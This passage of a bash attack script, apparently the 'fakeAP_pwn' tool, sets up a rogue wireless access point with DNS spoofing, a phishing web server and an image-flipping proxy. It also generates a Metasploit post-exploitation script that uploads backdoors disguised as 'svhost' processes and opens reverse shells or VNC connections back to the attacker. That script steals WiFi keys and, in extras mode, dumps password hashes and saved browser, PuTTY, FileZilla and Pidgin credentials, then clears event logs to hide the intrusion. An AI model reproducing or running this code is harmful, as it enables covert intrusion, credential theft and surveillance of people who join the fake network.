   if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install dnsspoof" "apt-get -y install dsniff" $verbose $diagnostics "true" ; fi
   if [ ! -e "/usr/sbin/dnsspoof" ] ; then
      display error "Failed to install dnsspoof" $diagnostics 1>&2
      cleanup;
   else
      display info "Installed dnsspoof" $diagnostics
   fi
fi
if [ "$mode" != "normal" ] ; then
   if [ ! -e "/usr/sbin/apache2" ] ; then
      display error "apache2 isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install apache2 php5" "apt-get -y install apache2 php5" $verbose $diagnostics "true" ; fi
      if [ ! -e "/usr/sbin/apache2" ] ; then
         display error "Failed to install apache2" $diagnostics 1>&2
         cleanup
      else
         display info "Installed apache2 & php5" $diagnostics
      fi
   fi
fi
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   if [ ! -e "/opt/metasploit3/bin/msfconsole" ] ; then
      display error "Metasploit isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install metasploit" "apt-get -y install framework3" $verbose $diagnostics "true" ; fi
      if [ ! -e "/opt/metasploit3/bin/msfconsole" ] ; then action "Install metasploit" "apt-get -y install metasploit" $verbose $diagnostics "true" ; fi
      if [ ! -e "/opt/metasploit3/bin/msfconsole" ] ; then
         display error "Failed to install metasploit" $diagnostics 1>&2
         cleanup
      else
         display info "Installed metasploit" $diagnostics
      fi
   fi
   if [ "$payload" == "sbd" ] ; then
      if [ ! -e "/usr/local/bin/sbd" ] ; then
         display error "sbd isn't installed." $diagnostics
         read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
         if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install sbd" "apt-get -y install sbd" $verbose $diagnostics "true" ;  fi
         if [ ! -e "/usr/local/bin/sbd" ] ; then
            display error "Failed to install sbd" $diagnostics 1>&2
            cleanup
         else
            display info "Installed sbd"
         fi
      fi
   elif [ "$payload" == "vnc" ] ; then
      if [ ! -e "/usr/bin/vncviewer" ] ; then
         display error "vnc isn't installed." $diagnostics
         read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
         if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install vnc" "apt-get -y install vnc" $verbose $diagnostics "true" ; fi
         if [ ! -e "/usr/bin/vncviewer" ] ; then
            display error "Failed to install vnc" $diagnostics 1>&2
            cleanup
         else
            display info "Installed vnc" $diagnostics
         fi
      fi
   elif [ "$payload" == "wkv" ] ; then
      if [ ! -e "$www/wkv-x86.exe" ] ; then display error "There isn't a wkv-x86.exe at $www/wkv-x86.exe." $diagnostics 1>&2; cleanup; fi
      if [ ! -e "$www/wkv-x64.exe" ] ; then display error "There isn't a wkv-x64.exe at $www/wkv-x64.exe." $diagnostics 1>&2; cleanup; fi
   else
      if [ ! -e "$backdoorPath" ] ; then display error "There isn't a backdoor at $backdoorPath." $diagnostics 1>&2; cleanup; fi
   fi
fi
if [ "$mode" == "flip" ] ; then
   if [ ! -e "/usr/sbin/squid" ] ; then
      display error "squid isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install squid" "apt-get -y install squid" $verbose $diagnostics "true" ;  fi
      if [ ! -e "/usr/sbin/squid" ] ; then
         display error "Failed to install squid" $diagnostics 1>&2
         cleanup
      else
         display info "Installed squid"
      fi
   fi
   if [ ! -e "/usr/bin/mogrify" ] ; then
      display error "mogrify isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install mogrify" "apt-get -y install imagemagick" $verbose $diagnostics "true" ;  fi
      if [ ! -e "/usr/sbin/squid" ] ; then
         display error "Failed to install mogrify" $diagnostics 1>&2
         cleanup
      else
         display info "Installed mogrify"
      fi
   fi
fi
if [ "$extras" == "true" ] ; then
   if [ ! -e "/usr/bin/imsniff" ] ; then
      display error "imsniff isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then "Install imsniff" "apt-get -y install imsniff" $verbose $diagnostics "true" ; fi
      if [ ! -e "/usr/bin/imsniff" ] ; then
         display error "Failed to install imsniff" $diagnostics 1>&2
         cleanup
      else
         display info "Installed imsniff" $diagnostics
      fi
   fi
   if [ ! -e "/usr/bin/driftnet" ] ; then
      display error "driftnet isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/n]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then "Install driftnet" "apt-get -y install driftnet" $verbose $diagnostics "true" ; fi
      if [ ! -e "/usr/bin/driftnet" ] ; then
         display error "Failed to install driftnet" $diagnostics 1>&2
         cleanup
      else
         display info "Installed driftnet" $diagnostics
      fi
   fi
fi

if [ "$mode" != "non" ] ; then
   action "Resetting interface" "ifconfig $interface up && sleep 1" $verbose $diagnostics "true" #command="ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" fails if you don't have DHCP
   command=$(ifconfig | grep -q -o "$interface")
   if [ ! $command == "" ] ; then display error "$interface is down" $diagnostics 1>&2; cleanup; fi # check to make sure $interface came up!
   command=$(ifconfig | grep $interface | awk '{print $1}')
   if [ "$command" != "$interface" ] ; then
      display error "The gateway interface $interface, isn't correct." $diagnostics 1>&2
      if [ "$debug" == "true" ] ; then ifconfig; fi
      display info "Switching mode to: non (No Internet access after infection)" $diagnostics
      mode="non"
   fi
   if [ -z "$ourIP" ] && [ "$mode" != "non" ] ; then # not sure if this 100% correct
      action "Acquiring an IP Address" "dhclient $interface" $verbose $diagnostics "true"
      sleep 3
      command=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
      if [ -z "$command" ] ; then
         display error "IP Problem. Haven't got an IP address on $interface." $diagnostics 1>&2
         pidcheck=$(ps aux | grep $interface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
         if [ -n "$pidcheck" ] ; then
            kill $pidcheck
         fi
         display info "Switching mode to: non (No Internet access after infection)" $diagnostics
         mode="non"
      else
         ourIP=$command
      fi
      command=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
      if [ "$command" == "" ] ; then
         display error "Gateway IP Problem. Can't detect the gateway on $interface." $diagnostics 1>&2
         display info  "Switching mode to: non (No Internet access after infection)" $diagnostics
         mode="non"
         gatewayIP="10.0.0.1" # For DHCP
      else
         gatewayIP=$command
      fi
   fi
else
   gatewayIP="10.0.0.1" # For DHCP
fi

command=$(ifconfig -a | grep $wifiInterface | awk '{print $1}')
if [ "$command" != "$wifiInterface" ] ; then
   display error "The wireless interface $wifiInterface, isn't correct." $diagnostics 1>&2
   if [ "$debug" == "true" ] ; then iwconfig; fi
   cleanup
fi

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then display action "Stopping: Programs" $diagnostics ; fi
action "Killing 'Programs'" "killall dhcpd3 apache2 wicd-client airbase-ng hostapd xterm" $verbose $diagnostics "true" # Killing "wicd-client" to prevent channel hopping
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then display action "Stopping: Daemons" $diagnostics ; fi
action "Killing 'dhcp3 service'" "/etc/init.d/dhcp3-server stop" $verbose $diagnostics "true"
if [ "$mode" == "flip" ] ; then action "Killing 'squid service'" "/etc/init.d/squid stop" $verbose $diagnostics "true" ; fi
if [ "$mode" != "normal" ] ; then action "Killing 'apache2 service'" "/etc/init.d/apache2 stop" $verbose $diagnostics "true" ; fi
action "Killing 'wicd service'" "/etc/init.d/wicd stop" $verbose $diagnostics "true" # Stopping wicd to prevent channel hopping

#----------------------------------------------------------------------------------------------#
display action "Configuring: Wireless card" $diagnostics
if [ "$apType" == "airbase-ng" ] ; then
   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" == "$monitorInterface" ] ; then
      action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" $verbose $diagnostics "true"
      sleep 1
   fi
fi
action "Refreshing $wifiInterface" "ifconfig $wifiInterface down && sleep 1 && ifconfig $wifiInterface up" $verbose $diagnostics "true"
command=$(ifconfig | grep -q -o  "$wifiInterface")
if [ ! $command == "" ] ; then display error "$wifiInterface is down" $diagnostics 1>&2; cleanup; fi # check to make sure $interface came up!
command=$(ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
if [ -n "$command" ] ; then
   action "Killing programs" "kill $command" $verbose $diagnostics "true" # to prevent interference
fi
if [ "$apType" == "airbase-ng" ] ; then
   action "Monitor Mode (Starting)" "airmon-ng start $wifiInterface" $verbose $diagnostics "true"
   #monitorInterface2=$(airmon-ng start $wifiInterface | awk '/monitor mode enabled on/{print $5}' | sed 's/\(.*\)./\1/')
   sleep 1
   ifconfig mon0 mtu $mtu
   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" != "$monitorInterface" ] ; then
      sleep 5 # Some people need to wait a little bit longer (e.g. VM), some don't. Don't force the ones that don't need it!
      command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
      if [ "$command" != "$monitorInterface" ] ; then
         display error "The monitor interface $monitorInterface, isn't correct." $diagnostics 1>&2
      if [ "$debug" == "true" ] ; then iwconfig; fi
      cleanup
      fi
   fi
fi
if [ "$apType" == "airbase-ng" ] ; then
   command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
   if [ $command ] ; then # $interface is WiFi. Therefore two WiFi cards
      command=$(iwlist $interface scan 2>/dev/null | grep "ESSID:")
      if [ "$diagnostics" == "true" ] ; then echo -e $command >> $logFile ; fi
      if [ ! -z "$command" ] ; then    # checking for a access point to test as we haven't created one yet
         if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display diag "Testing: Wireless Injection" $diagnostics ; fi
         command=$(aireplay-ng --test $monitorInterface -i $monitorInterface)
         if [ "$diagnostics" == "true" ] ; then echo -e $command >> $logFile ; fi
         if [ -z "$(echo \"$command\" | grep 'Injection is working')" ] ; then display error "$monitorInterface doesn't support packet injecting." $diagnostics 1>&2
         elif [ -z "$(echo \"$command\" | grep 'Found 0 APs')" ] ; then display error "Couldn't test packet injection" $diagnostics 1>&2;
         fi
      fi
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$apType" == "airbase-ng" ] ; then
   if [ "$fakeAPmac" == "random" ] || [ "$fakeAPmac" == "set" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: MAC address" $diagnostics ; fi
      command="ifconfig $monitorInterface down &&"
      if [ "$fakeAPmac" == "random" ] ; then  command="$command macchanger -A $monitorInterface"; fi
      if [ "$fakeAPmac" == "set" ] ; then  command="$command macchanger -m $macAddress $monitorInterface"; fi
      action "Changing MAC Address of FakeAP" "$command && ifconfig $monitorInterface up" $verbose $diagnostics "true"
      sleep 2
   fi
   if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
      macAddress=$(macchanger --show $monitorInterface | awk -F " " '{print $3}')
      macAddressType=$(macchanger --show $monitorInterface | awk -F "Current MAC: " '{print $2}')
      display info "     macAddress=$macAddressType" $diagnostics
   fi
elif [ "$apType" == "hostapd" ] ; then
   if [ "$fakeAPmac" == "random" ] || [ "$fakeAPmac" == "set" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: MAC address" $diagnostics ; fi
      command="ifconfig $wifiInterface down &&"
      if [ "$fakeAPmac" == "random" ] ; then  command="$command macchanger -A $wifiInterface"; fi
      if [ "$fakeAPmac" == "set" ] ; then  command="$command macchanger -m $macAddress $wifiInterface"; fi
      action "Changing MAC Address of FakeAP" "$command && ifconfig $wifiInterface up" $verbose $diagnostics "true"
      sleep 2
   fi
   if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
      macAddress=$(macchanger --show $wifiInterface | awk -F " " '{print $3}')
      macAddressType=$(macchanger --show $wifiInterface | awk -F "Current MAC: " '{print $2}')
      display info "     macAddress=$macAddressType" $diagnostics
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Creating: Scripts" $diagnostics
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   path="/tmp/fakeAP_pwn.rb" # metasploit script
   if [ -e "$path" ] ; then rm "$path"; fi
   echo "# ID: fakeAP_pwn.rb v$version
# Author: g0tmi1k at http://g0tmi1k.blogspot.com
################## Variable Declarations ##################
@client   = client
host,port = session.tunnel_peer.split(':')
os        = @client.sys.config.sysinfo['OS']
host      = @client.sys.config.sysinfo['Computer']
arch      = @client.sys.config.sysinfo['Architecture']
user      = @client.sys.config.getuid
date      = Time.now.strftime(\"%Y-%m-%d.%H:%M:%S\")
uac       = 0
######################## Functions ########################
def doLinux
	print_status(\"Coming soon\")
end
def doOSX
	print_status(\"Coming soon\")
end
def doWindows(uac)
	session.response_timeout=120
	begin" >> $path
   if [ "$payload" == "vnc" ] ; then echo "		print_status(\"   Stopping: winvnc.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost101.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"  Uploading: VNC\")
		exec = upload(session,\"$www/winvnc.exe\",\"svhost101.exe\",\"\")
		upload(session,\"$www/vnchooks.dll\",\"vnchooks.dll\",\"\")
		upload(session,\"$www/vnc.reg\",\"vnc.reg\",\"\")
		sleep(1)

		print_status(\"Configuring: VNC\")
		execute(session,\"cmd.exe /C regedit.exe /S %TEMP%\\\vnc.reg\", nil)
		sleep(1)

		if uac == 1
			print_status(\"    Waiting: 30 seconds the for the target to click \\\"yes\\\"\")
			sleep(30)
		end

		print_status(\"  Executing: winvnc (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} -kill -run\", nil)
		sleep(1)

		print_status(\"Configuring: VNC (Reserving connection).\")
		execute(session,\"cmd.exe /C #{exec} -connect 10.0.0.1\", nil)

		print_status(\"   Deleting: Traces\")
		delete(session, \"%SystemDrive%\\\vnc.reg\")" >> $path
   elif [ "$payload" == "sbd" ] ; then echo "		print_status(\" Stopping: sbd.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost102.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: SecureBackDoor\")
		exec = upload(session,\"$www/sbd.exe\",\"svhost102.exe\",\"\")
		sleep(1)

		print_status(\"Executing: sbd (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil)" >> $path
   elif [ "$payload" == "wkv" ] ; then echo "	print_status(\"  Uploading: WirelessKeyView\")
		if @client.sys.config.sysinfo['Architecture'] =~ (/x64/)
			exec = upload(session,\"$www/wkv-x64.exe\",\"\",\"\")
		else
			exec = upload(session,\"$www/wkv-x86.exe\",\"\",\"\")
		end
		sleep(1)

		print_status(\"  Executing: wkv (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} /stext %TEMP%\\\wkv.txt\", nil)
		sleep(1)

		if uac == 1
			print_status(\"    Waiting: 30 seconds the for the target to click \\\"yes\\\"\")
			sleep(30)
		end

		# Check for file!
		print_status(\"Downloading: WiFi keys (/tmp/fakeAP_pwn.wkv)\")
		session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%TEMP%\\\wkv.txt\")

		print_status(\"   Deleting: Traces\")
		delete(session, exec)
		delete(session, \"%TEMP%\\\wkv.txt\")" >> $path
   else echo "		print_status(\"Stopping: backdoor.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost103.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: backdoor.exe ($backdoorPath)\")
		exec = upload(session,\"$backdoorPath\",\"svhost103.exe\",\"\")
		sleep(1)

		print_status(\"Executing: backdoor\")
		execute(session,\"cmd.exe /C #{exec}\", nil)" >> $path
   fi
   echo "		sleep(1)
		return

	rescue ::Exception => e
		print_status(\"Error: #{e.class} #{e}\")
	end
end
def upload(session,file,filename = \"\",trgloc = \"\")
	if not ::File.exists?(file)
		raise \"File to upload does not exists!\"
	else
		if trgloc == \"\"
			location = session.fs.file.expand_path(\"%TEMP%\")
		else
			location = trgloc
		end
		begin
			if filename == \"\"
				ext = file[file.rindex(\".\") .. -1]
				if ext and ext.downcase == \".exe\"
					fileontrgt = \"#{location}\\\svhost#{rand(100)}.exe\"
				else
					fileontrgt = \"#{location}\\\TMP#{rand(100)}#{ext}\"
				end
			else
				fileontrgt = \"#{location}\\\#{filename}\"
			end
			session.fs.file.upload_file(\"#{fileontrgt}\",\"#{file}\")
		rescue ::Exception => e
			print_status(\"Error uploading file #{file}: #{e.class} #{e}\")
		end
	end
	return fileontrgt
end
def execute(session,cmdexe,opt)
	r=''
	session.response_timeout=120
	begin
		r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
		r.close
	rescue ::Exception => e
		print_status(\"Error Running Command #{cmdexe}: #{e.class} #{e}\")
	end
end
def delete(session, path)
   r = session.sys.process.execute(\"cmd.exe /c del /F /S /Q \" + path, nil, {'Hidden' => 'true'})
   while(r.name)
      select(nil, nil, nil, 0.10)
   end
   r.close
end
def checkUAC(session)
	begin
		open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Policies\\\System\", KEY_READ)
		value = open_key.query_value(\"EnableLUA\").data
	rescue ::Exception => e
		print_status(\"Error Checking UAC: #{e.class} #{e}\")
	end
	return (value)
end
########################### Main ##########################
print_line(\"[*] fakeAP_pwn $version\")" >> $path
   #if | [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ||  [ "$debug" == "true" ] ; then
      echo "print_status(\"-------------------------------------------\")
print_status(\"Date: #{date}\")
print_status(\"  IP: #{host}:#{port}\")
print_status(\"  OS: #{os}\")
if os =~ (/Windows Vista/) || os =~ (/Windows 7/)
	uac = checkUAC(session)
	if uac == 1
		print_error(\" UAC: Enabled\")
		session.core.use(\"priv\")
		#run kitrap0d # x86 ONLY
		#client.execute_script(\"script\",\"args\") #client.execute_script(\"multi_console_command\",[\"-cl\",'help,help\"])
	else
		print_status(\" UAC: Disabled\")
	end
end
print_status(\"Arch: #{arch}\")
print_status(\"Host: #{host}\")
print_status(\"User: #{user}\")
print_status(\"Mode: $payload\")
print_status(\"-------------------------------------------\")" >> $path
   #fi
   echo "if os =~ /Linux/
	doLinux
elsif os =~ /OSX/
	doOSX
elsif os =~ /Windows/
#	run getcountermeasure.rb -d
	doWindows(uac)
else
	print_error(\"Unsupported OS\")
	exit
end
print_status(\"Unlocking: fakeAP_pwn\")
output = ::File.open(\"/tmp/fakeAP_pwn.lock\", \"a\")
output.puts(\"fakeAP_pwn\")
output.close
sleep(1)" >> $path
   if [ "$extras" == "true" ] ; then echo "print_status(\"-------------------------------------------\")
print_status(\"Extras\")
screenshot
#----
session.core.use(\"priv\") #use priv
getsystem
hashes = session.priv.sam_hashes  #hashdump #> /tmp/fakeAP_Pwn.hash
####################################################################
   begin
      session.core.use(\"priv\")
      hashes = session.priv.sam_hashes
      print_status(\"Capturing windows hashes \")
      File.open(File.join(logs, \"hashes.txt\"), \"w\") do |fd|
         hashes.each do |user|
            fd.puts(user.to_s)
         end
      end
   rescue ::Exception => e
      print_status(\"Error dumping hashes: #{e.class} #{e}\")
   end
####################################################################
#----
sysinfo
ps
ipconfig
route
#enumdesktops
#getdesktop
#setdesktop
#----
run checkvm.rb
run dumplinks.rb -e
run enum_firefox.rb
run enum_logged_on_users.rb -c -l
run enum_putty.rb
run get_application_list.rb
run getcountermeasure.rb -d -k
run get_env.rb
run get_filezilla_creds.rb -c
run get_loggedon_users.rb -c -l
run get_pidgin_creds.rb -b -c -l
run getvncpw.rb
#run killav.rb
run remotewinenum.rb
run scraper.rb
run winenum.rb -r
#----
clearev
print_status(\"-------------------------------------------\")" >> $path
   fi
   echo "print_line(\"[*] Done!\")" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat "$path" ; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" $diagnostics 1>&2; cleanup; fi
fi
if [ "$mode" == "flip" ] ; then
   path="/tmp/fakeAP_pwn.pl" # Squid script
   if [ -e "$path" ] ; then rm "$path" ; fi
   echo -e "#!/usr/bin/perl
# fakeAP_pwn.pl v$version
$|=1;
\$count = 0;
\$pid = \$\$;
while (<>) {
	chomp \$_;
	if (\$_ =~ /(.*\.jpg)/i) {
		\$url = \$1;
		system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/images/\$pid-\$count.jpg\", \"\$url\");
		system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.jpg\");
		system(\"chmod\", \"666\", \"$www/images/\$pid-\$count.jpg\");
		print \"http://10.0.0.1/images/\$pid-\$count.jpg\\\n\";
	}
	elsif (\$_ =~ /(.*\.jpeg)/i) {
		\$url = \$1;
		system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/images/\$pid-\$count.jpeg\", \"\$url\");
		system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.jpeg\");
		system(\"chmod\", \"666\", \"$www/\$pid-\$count.jpeg\");
		print \"http://10.0.0.1/images/\$pid-\$count.jpeg\\\n\";
	}
	elsif (\$_ =~ /(.*\.gif)/i) {
		\$url = \$1;
		system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/\$pid-\$count.gif\", \"\$url\");
		system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.gif\");
		system(\"chmod\", \"666\", \"$www/\$pid-\$count.gif\");
		print \"http://10.0.0.1/images/\$pid-\$count.gif\\\n\";
	}
	elsif (\$_ =~ /(.*\.png)/i) {
		\$url = \$1;
		system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/\$pid-\$count.png\", \"\$url\");
		system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.png\");
		system(\"chmod\", \"666\", \"$www/\$pid-\$count.png\");
		print \"http://10.0.0.1/images/\$pid-\$count.png\\\n\";
	}
	else {
		print \"\$_\\\n\";;
	}
	\$count++;
}" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat "$path"; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" $diagnostics 1>&2; cleanup; fi

   path="/tmp/fakeAP_pwn.squid" # Squid config
   if [ -e "$path" ] ; then rm "$path" ; fi
   echo '# fakeAP_pwn.squid v$version
hierarchy_stoplist cgi-bin ?
acl QUERY urlpath_regex cgi-bin \?
no_cache deny QUERY
hosts_file /etc/hosts
url_rewrite_program /tmp/fakeAP_pwn.pl
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320
acl all src all
acl localhost src 127.0.0.1/32
acl to_localhost dst 127.0.0.0/8
acl localnet src 10.0.0.0/8
acl manager proto cache_object
acl SSL_ports port 443          # https
acl SSL_ports port 563          # snews
acl SSL_ports port 873          # rsync
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl Safe_ports port 631         # cups
acl Safe_ports port 873         # rsync
acl Safe_ports port 901         # SWAT
acl purge method PURGE
acl CONNECT method CONNECT
http_access allow manager localhost
http_access deny manager
http_access allow purge localhost
http_access deny purge' > $path
echo 'http_access deny !Safe_ports' >> $path
echo 'http_access deny CONNECT !SSL_ports' >> $path
echo 'http_access allow localnet
http_access allow localhost
http_access deny all
http_reply_access allow all
icp_access deny all
http_port 3128 transparent
visible_hostname myclient.hostname.com
access_log /var/log/squid/access.log squid
acl apache rep_header Server ^Apache
broken_vary_encoding allow apache
extension_methods REPORT MERGE MKACTIVITY CHECKOUT
coredump_dir /var/spool/squid' >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat "$path"; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" $diagnostics 1>&2; cleanup; fi
fi

path="/tmp/fakeAP_pwn.dhcp" # DHCP script
if [ -e "$path" ] ; then rm "$path"; fi
echo -e "# fakeAP_pwn.dhcp v$version
ddns-update-style none;
ignore client-updates; # Ignore all client requests for DDNS update
authoritative;
default-lease-time 86400; # 24 hours
max-lease-time 172800;    # 48 hours
log-facility local7;\n
subnet 10.0.0.0 netmask 255.255.255.0 {
	range 10.0.0.150 10.0.0.250;
	option routers 10.0.0.1;
	option subnet-mask 255.255.255.0;
	option broadcast-address 10.0.0.255;
	option domain-name \"Home.com\";" >> $path
if [ "$mode" == "normal" ] || [ "$mode" == "flip" ] || [ "$mode" == "transparent" ] ; then
	echo "	option domain-name-servers 208.67.222.220, 208.67.222.222;" >> $path
else
	echo "	option domain-name-servers 10.0.0.1;" >> $path
fi
echo -e "	option netbios-name-servers 10.0.0.100;\n}" >> $path
if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
if [ "$debug" == "true" ] ; then cat "$path" ; fi
if [ ! -e $path ] ; then display error "Couldn't create $path" $diagnostics 1>&2; cleanup; fi

if [ "$mode" != "normal" ] ; then
   path="/etc/apache2/sites-available/fakeAP_pwn"
   if [ -e "$path" ] ; then rm "$path"; fi # Apache (Virtual host)
   echo "# fakeAP_pwn v$version
	<VirtualHost *:80>
		ServerAdmin webmaster@localhost
		DocumentRoot $www
		ServerName \"10.0.0.1\"
		<Directory />
			Options FollowSymLinks
			AllowOverride None
		</Directory>
		<Directory $www>
			Options Indexes FollowSymLinks MultiViews
			AllowOverride None
			Order allow,deny
			allow from all
		</Directory>
		ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
		<directory \"/usr/lib/cgi-bin\">
			AllowOverride None
			Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
			Order allow,deny
			Allow from all
		</directory>
		ErrorLog /var/log/apache2/fakeAP_pwn-error.log
		LogLevel warn
		CustomLog /var/log/apache2/fakeAP_pwn-access.log combined
		ErrorDocument 403 /index.php
		ErrorDocument 404 /index.php
	</VirtualHost>
	<IfModule mod_ssl.c>
		<VirtualHost _default_:443>
			ServerAdmin webmaster@localhost
			DocumentRoot $www
			ServerName \"10.0.0.1\"
			<Directory />
				Options FollowSymLinks
				AllowOverride None
			</Directory>
			<Directory $www>
				Options Indexes FollowSymLinks MultiViews
				AllowOverride None
				Order allow,deny
				allow from all
			</Directory>
			<directory \"/usr/lib/cgi-bin\">
				AllowOverride None
				Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
				Order allow,deny
				Allow from all
			</directory>
			ErrorLog /var/log/apache2/error.log
			LogLevel warn
			CustomLog /var/log/apache2/ssl_fakeAP_pwn-access.log combined
			ErrorDocument 403 /index.php
			ErrorDocument 404 /index.php
			SSLEngine on
			SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
			SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
			<FilesMatch \"\.(cgi|shtml|phtml|php)$\">
				SSLOptions +StdEnvVars
			</FilesMatch>
			<Directory /usr/lib/cgi-bin>
				SSLOptions +StdEnvVars
			</Directory>
			BrowserMatch \"MSIE [2-6]\" \
				nokeepalive ssl-unclean-shutdown \
				downgrade-1.0 force-response-1.0
			BrowserMatch \"MSIE [17-9]\" ssl-unclean-shutdown
		</VirtualHost>
	</IfModule>" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat "$path" ; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" $diagnostics 1>&2; cleanup; fi
fi

if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   path="/tmp/fakeAP_pwn.dns" # DNS script
   if [ -e "$path" ] ; then rm "$path" ; fi
   echo -e "# fakeAP_pwn.dns v$version\n10.0.0.1 *" >> $path # dnsspoof
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat "$path" ; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" $diagnostics 1>&2; cleanup; fi
fi

if [ "$apType" == "hostapd" ] ; then
   path="/tmp/fakeAP_pwn.hostapd" # Hostapd config
   if [ -e "$path" ] ; then rm "$path"; fi
   echo "# fakeAP_pwn.hostapd v$version
interface=$apInterface
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
dump_file=/tmp/hostapd.dump
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0
ssid=$ESSID
hw_mode=g
channel=$channel
beacon_int=100
dtim_period=2
max_num_sta=255
rts_threshold=2347
fragm_threshold=2346
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0
eapol_key_index_workaround=0
eap_server=0
own_ip_addr=127.0.0.1
#wmm_enabled=1
#wmm_ac_bk_cwmin=4
#wmm_ac_bk_cwmax=10
#wmm_ac_bk_aifs=7
#wmm_ac_bk_txop_limit=0
#wmm_ac_bk_acm=0
#wmm_ac_be_aifs=3
